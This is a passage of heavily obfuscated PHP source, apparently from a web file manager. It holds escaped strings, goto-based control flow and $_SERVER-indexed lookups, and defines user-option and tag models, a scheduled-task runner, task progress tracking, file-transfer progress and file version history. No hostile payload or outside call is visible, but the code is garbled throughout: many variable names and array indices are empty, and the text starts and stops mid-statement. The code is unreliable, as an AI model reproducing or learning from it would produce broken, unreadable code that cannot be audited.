"\165\x73\145\x72\x5f\157\160\164\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($պ) { $ =& $_SERVER[]; $ڣ = defined($[2106]) && USER_ID ? USER_ID : $[12]; return "\x55\x73\145\162\117\x70\164\x69\157\156\x5f{$պ}\x5f" . $ڣ; } protected function filterWhere($) { $ƪŜ =& $_SERVER[]; $[$ƪŜ[1687]] = defined($ƪŜ[2106]) && USER_ID ? USER_ID : $ƪŜ[12]; return $; } public function cacheRemoveUser($, $э) { return Cache::remove("\x55\x73\145\162\117\160\x74\x69\x6f\156\x5f{$}\137" . $э); } protected function optionDefault($ٕ = '') { $ =& $_SERVER[]; if ($ٕ == $[12]) { return $GLOBALS[$[6]][$[2382]]; } if ($ٕ == $[2383]) { return $GLOBALS[$[6]][$[2384]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\162\x2e\164\x61\x67\114\151\x73\x74"; public $modelType = "\125\x73\145\162\117\x70\x74\x69\157\156"; public $field = array("\x6e\x61\x6d\x65", "\163\164\171\x6c\x65", "\163\157\162\164"); public function listData($廎 = false, $Ң = "\x73\x6f\162\x74", $ۮ = false) { return parent::listData($廎, $Ң, $ۮ); } public function remove($) { return parent::remove($); } public function add($Ǟצ, $ = "\x6c\x61\x62\145\x6c\55\147\x72\x65\x79\55\156\157\x72\155\x61\x6c") { $ =& $_SERVER[]; if ($this->findByName($Ǟצ)) { return !1; } $ע = array($[462] => $Ǟצ, $[526] => $, $[1889] => $this->getSort($[302]) + 1); return parent::insert($ע); } public function update($ڶ, $) { $ =& $_SERVER[]; $ݴ = $this->listData($ڶ); $ = $this->findByName($[$[32]]); if (!$ݴ || $ && $[$[443]] != $ݴ[$[443]]) { return !1; } return parent::update($ڶ, $); } public function moveTop($) { $ =& $_SERVER[]; $ = parent::listData(); $ = $this->getSort($[301]); foreach ($ as &$愔) { if ($愔[$[443]] == $) { $愔[$[1909]] = $; continue; } $愔[$[1909]] += 1; } unset($愔); return parent::resetData($); } public function moveBottom($) { $ =& $_SERVER[]; $ǫ = $this->getSort($[302]) + 1; return parent::update($, array($[1909] => $ǫ)); } public function resetSort($ؿ) { $ =& $_SERVER[]; $ܫ = array(); $ؿ = is_array($ؿ) ? $ؿ : array(); for ($睭 = 0; $睭 < count($ؿ); $睭++) { $ܫ[$ؿ[$睭] . $[12]] = $睭 + 1; } $ = parent::listData(); foreach ($ as &$) { $ޒą = $ܫ[$[$[443]]]; $[$[1909]] = $ޒą ? $ޒą : $[$[1909]]; } unset($); return parent::resetData($); } private function getSort($ͅ) { $ =& $_SERVER[]; $̜ = parent::listData(); $ܞ = array_to_keyvalue($̜, $[12], $[1909]); if (!$ܞ) { $ܞ = array(0); } $濷ԃ = $ͅ == $[302] ? max($ܞ) : min($ܞ); return intval($濷ԃ); } } goto D; a: define($_SERVER[][282], 1); define($_SERVER[][283], 2); define($_SERVER[][284], 3); goto Fɐ; b󹐒: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ƍ =& $_SERVER[]; if (self::valueGet($ƍ[784]) != $ƍ[88]) { return; } if (self::valueGet($ƍ[1643]) == $ƍ[88]) { $殀Ճ = self::valueGet($ƍ[1644]); if (time() - $殀Ճ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ƍ[1643], $ƍ[88]); self::log($ƍ[1645] . ACTION . $ƍ[1646]); Hook::bind($ƍ[1647], $ƍ[1648]); $֢ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ƍ[784]) != $ƍ[88]) { self::valueSet($ƍ[1643], $ƍ[212]); self::log($ƍ[1649]); die; } $ۮ = time(); if ($ۮ - $֢ >= 60) { self::valueSet(array($ƍ[1643] => $ƍ[88], $ƍ[1644] => $ۮ), !1); $֢ = $ۮ; } if (!file_exists(USER_SYSTEM . $ƍ[1650])) { self::valueSet(array($ƍ[1643] => $ƍ[212], $ƍ[784] => $ƍ[212]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ =& $_SERVER[]; http_close(); $GLOBALS[$[1651]] = 1; $_SERVER[$[1652]] = $[1653]; $_COOKIE = array(); $GLOBALS[$[536]] = 1; $GLOBALS[$[1654]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $҅ =& $_SERVER[]; http_close(); self::valueSet($҅[784], $҅[212]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($҅[1643] => $҅[212], $҅[784] => $҅[88]), !1); } public static function taskSwitch() { $ҋ֯ =& $_SERVER[]; $ = self::valueGet($ҋ֯[784]) == $ҋ֯[88] ? $ҋ֯[212] : $ҋ֯[88]; self::valueSet($ҋ֯[784], $); } public static function shutdownEvent() { $ʥʯ =& $_SERVER[]; self::valueSet($ʥʯ[1643], $ʥʯ[212]); self::log($ʥʯ[1655]); } public static function config($, $ޗۓ) { self::valueSet($_SERVER[][784], $); } private static function taskRunAll() { $ =& $_SERVER[]; $ = timeFloat(); $ލϼ = Model($[1656])->listData(); $ = count($ލϼ); for ($ = 0; $ < $; $++) { $ = $ލϼ[$]; if (!$[$[443]] || $[$[1657]] != $[88]) { continue; } if (!self::taskTimeCheck($)) { continue; } self::taskRun($); } Hook::trigger($[1658]); self::taskQueueRun($); } private static function taskQueueRun($) { $˾ = 10; while (!0) { $ = TaskQueue::run(); if ($ === !1) { break; } if (timeFloat() - $ >= $˾) { break; } } } private static function taskTimeCheck($ӣ) { $ =& $_SERVER[]; $ᜬ = json_decode($ӣ[$[194]], !0); $ = intval($ӣ[$[1644]]); $ = strtotime($[1659] . $ᜬ[$[1660]] . $[1661]) - strtotime($[1662]); $ = time() - strtotime(date($[1663]) . $[1664]); $ = $ >= $ && $ <= $ + 3600; switch ($ᜬ[$[33]]) { case $[1665]: if (time() - $ < 3600 * 24 * 30) { return !1; } if ($ᜬ[$[1665]] == date($[1666]) && $) { return !0; } break; case $[1667]: if (time() - $ < 3600 * 24 * 7) { return !1; } $ǜ = date($[1668]) == 0 ? 7 : date($[1668]); if ($ᜬ[$[1667]] == $ǜ && $) { return !0; } break; case $[1660]: if (time() - $ < 3600 * 24) { return !1; } if ($) { return !0; } break; case $[1669]: if (time() - $ >= floatval($ᜬ[$[1669]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ =& $_SERVER[]; static $ = 0; $񙹢 = 300; if (!$) { $ = time(); } if (time() - $ < $񙹢) { return; } $ = time(); $ = Model($[546])->db($[12]); if ($) { $->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($[1670], $[1671]); die; } } public static function taskRun($ֲݡ) { $ޜ =& $_SERVER[]; self::log($ޜ[1672] . $ֲݡ[$ޜ[443]] . $ޜ[1673] . $ֲݡ[$ޜ[32]] . $ޜ[1674] . $ֲݡ[$ޜ[1675]]); Model($ޜ[1656])->run($ֲݡ[$ޜ[443]]); $Ϡ = timeFloat(); $Û = $ޜ[12]; switch ($ֲݡ[$ޜ[33]]) { case $ޜ[351]: $ޭǧ = url_request($ֲݡ[$ޜ[1675]], $ޜ[245], !1, !1, !1, !1, 10); if ($ޭǧ[$ޜ[784]]) { $Û = strlen($ޭǧ[$ޜ[1243]]); } break; case $ޜ[244]: $Û = Hook::apply($ֲݡ[$ޜ[1675]]); default: break; } Model($ޜ[1676])->add(array($ޜ[1677] => $ޜ[12], $ޜ[1678] => $ޜ[212], $ޜ[33] => $ޜ[1679] . $ֲݡ[$ޜ[443]], $ޜ[1680] => json_encode(array($ޜ[32] => $ֲݡ[$ޜ[32]], $ޜ[1681] => timeFloat() - $Ϡ, $ޜ[337] => $Û)))); $突 = $Û ? $ޜ[1682] . $Û : $ޜ[12]; self::log($ޜ[1683] . $ֲݡ[$ޜ[443]] . $ޜ[165] . $突); return !0; } public static function valueGet($) { $ =& $_SERVER[]; $ = $[1684]; $쏍 = Model($[476])->get($, $); if (is_null($쏍)) { Model($[476])->set($[784], $[88], $); Model($[476])->set($[1643], $[212], $); $쏍 = Model($[476])->get($, $); } return $쏍; } private static function valueSet($, $) { $ȗ =& $_SERVER[]; $Մ = $ȗ[1685]; CacheLock::lock($Մ); $ٙ = Model($ȗ[476])->set($, $, $ȗ[1684]); CacheLock::unlock($Մ); return $ٙ; } protected static function log($㻦) { write_log($㻦, $_SERVER[][1671]); } private static function cacheClear() { $ =& $_SERVER[]; Cache::clearMemory(Model($[476])->cacheKey($[1684])); Cache::clearMemory(Model($[476])->cacheKey($[1686])); Model($[1656])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\157\160"; const STATYS_RUNNING = "\x72\x75\x6e\156\151\x6e\147"; const STATYS_KILL = "\153\151\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($, $䯞 = '', $ڌ = 0, $ٱ = '') { $荬̰ =& $_SERVER[]; if (self::get($)) { return; } $this->task = array($荬̰[443] => $, $荬̰[1687] => USER_ID, $荬̰[1584] => $ٱ, $荬̰[494] => $荬̰[12], $荬̰[33] => $䯞, $荬̰[1103] => $荬̰[12], $荬̰[820] => $ڌ, $荬̰[1688] => 0, $荬̰[1689] => 0, $荬̰[1690] => 0, $荬̰[1691] => timeFloat(), $荬̰[1692] => 0, $荬̰[1693] => 0, $荬̰[1694] => 0, $荬̰[1695] => 0, $荬̰[784] => $荬̰[1643]); $GLOBALS[$荬̰[1696]] = 1; Hook::bind($荬̰[1647], array($this, $荬̰[1697])); Hook::bind($荬̰[1698], array($this, $荬̰[1699])); $this->startAfter(); Hook::trigger($荬̰[1700], $this->task); $this->task[$荬̰[1693]] = timeFloat(); } public function end($΍ل = '') { $Ǐ =& $_SERVER[]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$Ǐ[1693]]) { self::valueSet($this->task[$Ǐ[443]], !1); } $this->isEnd = !0; if ($΍ل) { $this->task[$Ǐ[494]] = $΍ل; } self::log($Ǐ[1701] . $this->task[$Ǐ[443]] . $Ǐ[1702] . sprintf($Ǐ[885], timeFloat() - $this->task[$Ǐ[1691]]) . $Ǐ[1703]); Hook::unbind($Ǐ[1647], array($this, $Ǐ[1697])); Hook::unbind($Ǐ[1698], array($this, $Ǐ[1699])); $this->endAfter(); $ = $this->task; $this->task = !1; Hook::trigger($Ǐ[1704], $); } public function update($ = 0, $ = false) { $ޑ =& $_SERVER[]; $، =& $this->task; if (!$،) { return; } $،[$ޑ[1688]] += $; $،[$ޑ[1692]] = timeFloat(); if ($،[$ޑ[820]]) { if ($،[$ޑ[820]] < $،[$ޑ[1688]]) { $،[$ޑ[820]] = $،[$ޑ[1688]]; } $ = timeFloat() - $،[$ޑ[1691]] - $،[$ޑ[1694]]; if ($ <= 0) { $ = 0.001; } $،[$ޑ[1689]] = $،[$ޑ[1688]] / $،[$ޑ[820]]; $،[$ޑ[1690]] = $،[$ޑ[1688]] / $; if ($،[$ޑ[1689]] > 0) { $،[$ޑ[1695]] = $ * (1 - $،[$ޑ[1689]]) / $،[$ޑ[1689]]; } $،[$ޑ[1695]] = $،[$ޑ[1695]] <= 0 ? 0 : $،[$ޑ[1695]]; } $this->updateAfter(); $ܰ = 0.2; if (timeFloat() - $،[$ޑ[1693]] < $ܰ && !$) { return; } $ڊ = self::get($،[$ޑ[443]]); $ӟʧ = $ڊ[$ޑ[784]]; if ($ӟʧ == self::STATYS_KILL) { $ = array($ޑ[1705] => LNG($ޑ[1706]), $ޑ[1253] => !1); Cache::set($ޑ[1707] . $this->task[$ޑ[443]], $, 30); $this->onKill(); $this->end(); die; } else { if ($ӟʧ == self::STATYS_STOP) { $ = 2; $ڊ[$ޑ[1694]] += $; self::valueSet($،[$ޑ[443]], $ڊ); sleep($); $this->update(); return; } } $،[$ޑ[784]] = $ӟʧ ? $ӟʧ : $،[$ޑ[784]]; $،[$ޑ[1694]] = $ڊ[$ޑ[1694]] ? $ڊ[$ޑ[1694]] : 0; $،[$ޑ[1693]] = timeFloat(); Hook::trigger($ޑ[1708], $،); self::valueSet($،[$ޑ[443]], $،); } public function onKillSet($ξ, $ސ = array()) { $this->onKillCall = array($ξ, $ސ); } public function onKill() { $Ќ =& $_SERVER[]; self::log($Ќ[1701] . $this->task[$Ќ[443]] . $Ќ[1709]); Hook::trigger($Ќ[1710], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($κ) { $۪ =& $_SERVER[]; Cache::set($۪[1707] . $this->task[$۪[443]], $κ, 60); return $κ; } public static function get($) { $ =& $_SERVER[]; $Ä = self::valueGet($); if (is_array($Ä) && $Ä[$[1711]]) { $뱣 = ActionApply($Ä[$[1711]], array($Ä)); $Ä = is_array($뱣) ? $뱣 : $Ä; } return $Ä; } public static function listData() { $֜ = self::valueGet(); return array_sort_by($֜, $_SERVER[][1691], !0); } public static function kill($) { return self::changeStatus($, self::STATYS_KILL); } public static function stop($ɸ) { return self::changeStatus($ɸ, self::STATYS_STOP); } public static function restart($׍) { return self::changeStatus($׍, self::STATYS_RUNNING); } public static function killAll() { $Ҫ =& $_SERVER[]; $ = self::listData(); foreach ($ as $) { self::kill($[$Ҫ[443]]); } sleep(2); foreach ($ as $) { self::valueSet($[$Ҫ[443]], !1); } } private static function changeStatus($¥, $ԟ) { $ =& $_SERVER[]; $ȏЙ = self::valueGet($¥); if (!$ȏЙ) { return !1; } $ȏЙ[$[784]] = $ԟ; self::valueSet($¥, $ȏЙ); self::log($[1712] . $ȏЙ[$[443]] . $[1713] . $ԟ); return !0; } public static function valueGet($ĳ = false) { $ݿ =& $_SERVER[]; if ($ĳ) { $ē = Model($ݿ[488])->where(array($ݿ[94] => $ĳ, $ݿ[33] => $ݿ[1110]))->find(); return $ē ? json_decode($ē[$ݿ[418]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ = false) { $ݩݹ =& $_SERVER[]; $ֿ = array($ݩݹ[33] => $ݩݹ[1110]); if ($) { $ֿ[$ݩݹ[1687]] = $; } $鳚 = Model($ݩݹ[488])->where($ֿ)->select(); $鳚 = $鳚 ? $鳚 : array(); foreach ($鳚 as $ԗ => $) { $鳚[$ԗ] = json_decode($[$ݩݹ[418]], !0); } return $鳚; } public static function valueSet($δ, $) { $ޣ =& $_SERVER[]; if (!$) { return Model($ޣ[488])->where(array($ޣ[94] => $δ, $ޣ[33] => $ޣ[1110]))->delete(); } $ = json_encode($); if (!$) { ob_start(); var_dump($); $ޙ = ob_get_clean(); self::log($ޣ[1714] . json_encode_force($ޙ)); } if (!$δ || !$[$ޣ[443]]) { return !1; } $ = array($ޣ[33] => $ޣ[1110], $ޣ[1687] => USER_ID, $ޣ[94] => $δ, $ޣ[418] => $); $؃ = $ޣ[1715]; CacheLock::lock($؃); Model($ޣ[488])->add($, array(), !0); CacheLock::unlock($؃); } public static function log($پ) { if (!GLOBAL_DEBUG) { return; } write_log($پ, $_SERVER[][1716]); } } class TaskFileTransfer extends Task { protected function startAfter() { $݉ =& $_SERVER[]; $֞ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($݉[1717], array($this, $݉[1718])); Hook::bind($݉[1264], array($this, $݉[1719])); Hook::bind($݉[1720], array($this, $݉[1721])); Hook::bind($݉[636], array($this, $݉[1722])); Hook::bind($݉[637], array($this, $݉[1723])); Hook::bind($݉[644], array($this, $݉[1724])); Hook::bind($݉[645], array($this, $݉[1725])); Hook::bind($݉[639], array($this, $݉[1726])); Hook::bind($݉[642], array($this, $݉[1727])); Hook::bind($݉[605], array($this, $݉[1728])); Hook::bind($݉[602], array($this, $݉[1728])); Hook::bind($݉[607], array($this, $݉[1728])); Hook::bind($݉[609], array($this, $݉[1728])); Hook::bind($݉[611], array($this, $݉[1728])); Hook::bind($݉[1729], array($this, $݉[1730])); Hook::bind($݉[627], array($this, $݉[1731])); $this->sourceModelCopyFlag = !1; Hook::bind($݉[1732], array($this, $݉[1733])); Hook::bind($݉[1734], array($this, $݉[1735])); Hook::bind($݉[1736], array($this, $݉[1737])); $֞[$݉[1738]] = LNG($݉[1739]); $֞[$݉[1740]] = 0; $֞[$݉[1741]] = 0; $֞[$݉[1103]] = $݉[12]; $֞[$݉[1742]] = $݉[12]; $֞[$݉[1743]] = 0; $֞[$݉[1744]] = 0; $֞[$݉[1745]] = 0; if (!$֞[$݉[1584]]) { $֞[$݉[1584]] = LNG($݉[1746]); } } protected function endAfter() { $ =& $_SERVER[]; Hook::unbind($[1717], array($this, $[1718])); Hook::unbind($[1264], array($this, $[1719])); Hook::unbind($[1720], array($this, $[1721])); Hook::unbind($[636], array($this, $[1722])); Hook::unbind($[637], array($this, $[1723])); Hook::unbind($[644], array($this, $[1724])); Hook::unbind($[645], array($this, $[1725])); Hook::unbind($[639], array($this, $[1726])); Hook::unbind($[642], array($this, $[1727])); Hook::unbind($[605], array($this, $[1728])); Hook::unbind($[602], array($this, $[1728])); Hook::unbind($[607], array($this, $[1728])); Hook::unbind($[609], array($this, $[1728])); Hook::unbind($[611], array($this, $[1728])); Hook::unbind($[1729], array($this, $[1730])); Hook::unbind($[627], array($this, $[1731])); Hook::unbind($[1732], array($this, $[1733])); Hook::unbind($[1734], array($this, $[1735])); Hook::unbind($[1736], array($this, $[1737])); } public function copyMoveStart($֗ݝ, $˾, $Ƅ, $ӳ踻) { $ǂ =& $_SERVER[]; self::log($ǂ[1747] . $˾ . $ǂ[70] . $ӳ踻); $ = rtrim(TEMP_FILES, $ǂ[8]); if (substr($˾, 0, strlen($)) == $) { return; } if (substr($ӳ踻, 0, strlen($)) == $) { return; } $厖 =& $this->task; $厖[$ǂ[1748]] = KodIO::transferType($֗ݝ, $Ƅ); $this->update(); } public function updateAfter() { $ =& $_SERVER[]; $ =& $this->task; if (!$[$[797]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($[$[1748]] == $[1356]) { return; } self::updateTask($); } private static function updateTask(&$) { $῞ =& $_SERVER[]; if ($[$῞[1748]] == $῞[1235] || $[$῞[1748]] == $῞[107]) { if ($[$῞[1742]]) { $[$῞[1745]] = $[$῞[1744]] + $[$῞[1741]]; } } else { if ($[$῞[1748]] == $῞[1357]) { if ($[$῞[1742]] == $῞[1235]) { $[$῞[1745]] = $[$῞[1744]] + $[$῞[1741]] * 0.5; } else { if ($[$῞[1742]] == $῞[107]) { $[$῞[1745]] = $[$῞[1744]] + $[$῞[1740]] * 0.5 + $[$῞[1741]] * 0.5; } } } } $[$῞[1689]] = $[$῞[1745]] / $[$῞[797]]; if ($[$῞[1689]] > 0) { $ = timeFloat() - $[$῞[1691]] - $[$῞[1694]]; $[$῞[1695]] = $ * (1 - $[$῞[1689]]) / $[$῞[1689]]; } } public function addPath($ӷ) { $ط =& $_SERVER[]; if (!$ӷ) { return; } $ =& $this->task; $ۅ = IO::infoWithChildren($ӷ); $ʥ = $[$ط[1749]] ? $[$ط[1749]][$ط[1750]] : 0; $[$ط[1749]] = array($ط[1750] => $ʥ + 1, $ط[462] => $ۅ[$ط[32]], $ط[84] => $ۅ[$ط[84]], $ط[551] => $ۅ[$ط[551]] ? $ۅ[$ط[551]] : $ۅ[$ط[84]]); if ($ۅ[$ط[33]] == $ط[214]) { $[$ط[820]] += 1; } else { $[$ط[820]] += $ۅ[$ط[79]][$ط[77]]; if ($ۅ[$ط[181]]) { $[$ط[820]] += $ۅ[$ط[79]][$ط[78]] + 1; } } $[$ط[797]] += $ۅ[$ط[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ꐪ) { } public function sourceAddHashEnd($А) { } public function sourceAddFileStart($翌) { $煎 =& $_SERVER[]; $ =& $this->task; $[$煎[1740]] = $翌[$煎[76]]; $[$煎[1738]] = $翌[$煎[32]]; $[$煎[1103]] = $翌[$煎[32]]; $[$煎[1751]] = $翌[$煎[84]]; $this->update(); } public function sourceAddFileEnd($) { $ =& $_SERVER[]; $޾ =& $this->task; $޾[$[1745]] += $[$[76]]; $޾[$[1751]] = $[$[84]]; $this->update(1); } public function copyFileStart($ƴ, $, $, $ܹޢ, $, $) { $צ =& $_SERVER[]; $ = $; if ($ == $GLOBALS[$צ[1752]]) { $ = $GLOBALS[$צ[1753]]; } $GLOBALS[$צ[1753]] = $; $GLOBALS[$צ[1752]] = $; $ =& $this->task; $[$צ[1738]] = $; $[$צ[1740]] = (int) $ƴ->size($); $[$צ[1741]] = 0; $[$צ[1103]] = $צ[12]; $[$צ[1742]] = $צ[12]; $[$צ[1743]] = 0; $ބ = $[$צ[1740]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($[$צ[443]] . $צ[1754]); if ($ބ && file_exists(get_path_father($ܹޢ))) { Cache::set($[$צ[443]] . $צ[1754], $ܹޢ); $[$צ[1711]] = array($צ[1755], $צ[1756]); } $this->update(0, $ބ); } public static function updateCopyLocalFileSize($ٳ) { $ѫ =& $_SERVER[]; $Ͷ = Cache::get($ٳ[$ѫ[443]] . $ѫ[1754]); if (!$Ͷ || !file_exists($Ͷ)) { return $ٳ; } $ٳ[$ѫ[1741]] = @filesize($Ͷ); $ٳ[$ѫ[1745]] += $ٳ[$ѫ[1741]]; self::updateTask($ٳ); return $ٳ; } public function copyFileEnd($̟, $᱇, $, $, $Ì, $櫹) { $ǰ =& $_SERVER[]; $皍ȃ =& $this->task; $皍ȃ[$ǰ[1741]] = $皍ȃ[$ǰ[1740]]; $皍ȃ[$ǰ[1742]] = $ǰ[12]; unset($皍ȃ[$ǰ[1711]]); if ($Ì == $皍ȃ[$ǰ[1738]]) { $皍ȃ[$ǰ[1744]] += $皍ȃ[$ǰ[1740]]; $皍ȃ[$ǰ[1745]] = $皍ȃ[$ǰ[1744]]; $ڐ = 1; if (isset($皍ȃ[$ǰ[1751]]) && $皍ȃ[$ǰ[1751]] == $᱇) { $ڐ = 0; } $this->update($ڐ); } else { $this->update(); $皍ȃ[$ǰ[1741]] = 0; } Cache::remove($皍ȃ[$ǰ[443]] . $ǰ[1754]); self::log($ǰ[1757] . $᱇ . $ǰ[70] . $ . $ǰ[246] . $Ì . $ǰ[1758] . $皍ȃ[$ǰ[1738]]); } public function updateFileEnd($ƙ٩, $֖) { $ =& $_SERVER[]; $ =& $this->task; $[$[1738]] = $ƙ٩; $[$[1740]] = $֖; $[$[1744]] += $֖; $[$[1745]] = $[$[1744]]; $this->update(1); self::log($[1759] . $ƙ٩); } public function sourceModelCopy($) { $ɕ =& $_SERVER[]; $ = $[0]; $ۖ = $[1]; $Ƴ =& $this->task; $this->sourceModelCopyFlag = !0; $ = 0; switch ($) { case $ɕ[603]: $ = 1; break; case $ɕ[606]: $Ƴ[$ɕ[1738]] = $ۖ[$ɕ[32]]; break; case $ɕ[608]: $ = intval($[$ɕ[424]] * 0.4); break; case $ɕ[610]: $ = intval($[$ɕ[424]] * 0.2); break; case $ɕ[612]: $ = intval($[$ɕ[424]] * 0.4); break; } $this->update($); $this->sourceModelCopyFlag = !1; } public function sourceRemove($܄, $) { $̑ =& $_SERVER[]; $this->sourceModelCopyFlag = !0; $ʶ = 1; if (isset($܄[$̑[79]])) { $ʶ = $܄[$̑[79]][$̑[77]]; $ʶ = $ʶ + $܄[$̑[79]][$̑[78]] + 1; } $this->update($ʶ); $this->sourceModelCopyFlag = !1; } public function sourceMove($ͪۋ) { $this->sourceRemove($ͪۋ, !1); } public function curlProgress($, $˘õݒ, $һӖ, $߃, $) { $ʤ =& $_SERVER[]; $ =& $this->task; if ($ > 0) { $[$ʤ[1103]] = $ʤ[1760]; $[$ʤ[1742]] = $ʤ[107]; if ($[$ʤ[1740]]) { $[$ʤ[1741]] = $; } if ($[$ʤ[1743]]) { $[$ʤ[1741]] = $ + $[$ʤ[1743]]; } } else { if ($һӖ > 0) { if ($[$ʤ[1740]] == $˘õݒ) { $[$ʤ[1741]] = $һӖ; $[$ʤ[1103]] = $ʤ[1761]; $[$ʤ[1742]] = $ʤ[1235]; } } } $this->update(); } public function curlProgressStart($΀) { } public function curlProgressEnd($Ǥ) { $С =& $_SERVER[]; $ٌ =& $this->task; $ = curl_getinfo($Ǥ); $Ј = $[$С[1762]]; if ($Ј == -1) { $Ј = $[$С[1763]]; } if ($ٌ[$С[1742]] == $С[107] && $Ј) { $ٌ[$С[1743]] += $Ј; } $this->update(); } } goto DƂ; A΢: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ʂ顶 =& $_SERVER[]; $Ԛ = $GLOBALS[$ʂ顶[6]][$ʂ顶[89]]; if ($Ԛ[$ʂ顶[1257]] != 1) { return; } if ($Ԛ[$ʂ顶[1258]] <= 0) { return; } if (isset($_REQUEST[$ʂ顶[1259]]) && $_REQUEST[$ʂ顶[1259]] == $ʂ顶[88]) { return; } Hook::bind($ʂ顶[1260], $ʂ顶[1261]); Hook::bind($ʂ顶[1262], $ʂ顶[1263]); Hook::bind($ʂ顶[1264], $ʂ顶[1265]); Hook::bind($ʂ顶[1266], $ʂ顶[1267]); Hook::bind($ʂ顶[1268], $ʂ顶[1269]); Hook::bind($ʂ顶[1270], $ʂ顶[1271]); } public static function eventBeforeUpload($) { if ($[3] && $[3] != REPEAT_REPLACE) { return; } $Ƥ = self::parsePath($[0]); if (!$Ƥ) { return; } self::add($Ƥ); } public static function eventBeforeEdit($) { $ = self::parsePath($[0]); if (!$) { return; } self::add($); } public static function eventBeforeCopyFile($, $Ҍ, $, $, $Ğҹ, $) { $ɾֆ =& $_SERVER[]; if (isset($->_data[$ɾֆ[1194]]) && $->_data[$ɾֆ[1194]]) { return; } $Ւ = $->getPathOuter($); $ = self::parsePath($Ւ); if (!$) { return; } self::add($); } public static function eventBeforeRename($ќ) { $ =& $_SERVER[]; $翷 = self::parsePath($ќ[0]); if (!$翷) { return; } $ڨ = self::checkInHistory($翷); if (!$ڨ) { return; } if ($ڨ[$[33]] == $[214]) { $˸ = self::listData($翷); if ($˸ && $˸[$[413]]) { self::moveHistory($翷, $ќ[1]); } } else { IO::rename($ڨ[$[84]], $ќ[1]); } } public static function eventBeforeMove($) { $ =& $_SERVER[]; $ = self::parsePath($[0]); if (!$) { return; } $ŵ = self::parsePath($[1]); if (!$ŵ) { return; } $ = $[3]; $ = self::checkInHistory($); if (!$) { return; } $ = self::pathHistory($ŵ); if ($[$[33]] == $[214]) { $ͬ = self::listData($); $ǯ = rtrim($ŵ, $[8]) . $[8] . ($ ? $ : get_path_this($)); $ⵗ = self::listData($ǯ); if ($ͬ && $ͬ[$[413]] && $ⵗ && $ⵗ[$[413]]) { return self::clear($); } if ($ͬ && $ͬ[$[413]]) { self::moveHistory($, $, $); } } else { IO::move($[$[84]], $, !1, $); self::clearEmptyFolder(IO::pathFather($[$[84]])); } } public static function eventAfterRemove($ئ, $) { $ =& $_SERVER[]; if (!$) { return; } $Ì = self::parsePath($ئ[0]); if (!$Ì) { return; } $̝ = self::checkInHistory($Ì); if (!$̝) { return; } if ($̝[$[33]] == $[214]) { $Ҡ = self::listData($Ì, !1); if ($Ҡ && $Ҡ[$[413]]) { self::clear($Ì, !1); } } else { IO::remove($̝[$[84]]); self::clearEmptyFolder(IO::pathFather($̝[$[84]])); } } private static function checkInHistory($) { $ = self::pathHistory($); if (!IO::exist($)) { $ .= $_SERVER[][1272]; } return IO::exist($) ? IO::info($) : !1; } private static function parsePath($򞨬) { $ =& $_SERVER[]; if (!$򞨬) { return !1; } if ($GLOBALS[$[1273]]) { return; } $ˮ = KodIO::parse($򞨬); $ = $ˮ[$[33]]; $ǯ = !$ || $ == KodIO::KOD_IO || $ == KodIO::KOD_SHARE_ITEM; if (!$ǯ || !$ˮ[$[1274]]) { return !1; } if (substr($򞨬, 0, strlen(DATA_PATH . $[1275])) == DATA_PATH . $[1275]) { return !1; } if ($ == KodIO::KOD_SHARE_ITEM) { $ = IO::init($򞨬); if ($->pathParse[$[1190]]) { return self::parsePath($->pathParse[$[1190]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Ȏ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $[1276]); foreach ($Ȏ as $҄ʯ) { if (!$ && substr($򞨬, 0, strlen($҄ʯ)) == $҄ʯ) { return !1; } } self::log($GLOBALS[$[1185]] . $[1277] . $򞨬); return $򞨬; } private static function pathHistory($ף) { $쥌 =& $_SERVER[]; $ = self::$_historyBase . ltrim(KodIO::clear($ף), $쥌[8]); $ = str_replace(array($쥌[1278]), array($쥌[1279]), $); return $; } public static function log($ٵ) { } public static function historyCount($Ŝ) { $Ԗ =& $_SERVER[]; $ = array(); $ = array(); foreach ($Ŝ as $) { $ͺ؉ = get_path_father($); if (!$[$ͺ؉]) { $[$ͺ؉] = array(); } $[$ͺ؉][] = get_path_this($); } foreach ($ as $ͺ؉ => $ǩ) { $ = self::parsePath($ͺ؉); if (!$) { continue; } foreach ($ǩ as $) { $ = self::listData(rtrim($, $Ԗ[8]) . $Ԗ[8] . $, !1); if ($ && $[$Ԗ[413]]) { $[rtrim($ͺ؉, $Ԗ[8]) . $Ԗ[8] . $] = count($[$Ԗ[413]]); } } } return $; } public static function add($) { $ҹ =& $_SERVER[]; $ġꫦ = self::listData($); if (!$ġꫦ) { return; } $ = Model($ҹ[804])->get($ҹ[1280]); $ = $GLOBALS[$ҹ[6]][$ҹ[89]][$ҹ[1258]]; $ۯ = $ == $ҹ[1281] ? min(5, $) : $; if ($ <= 0) { return; } $֑Ԟ = IO::info($); $ޅӳ = $ġꫦ[$ҹ[413]]; if 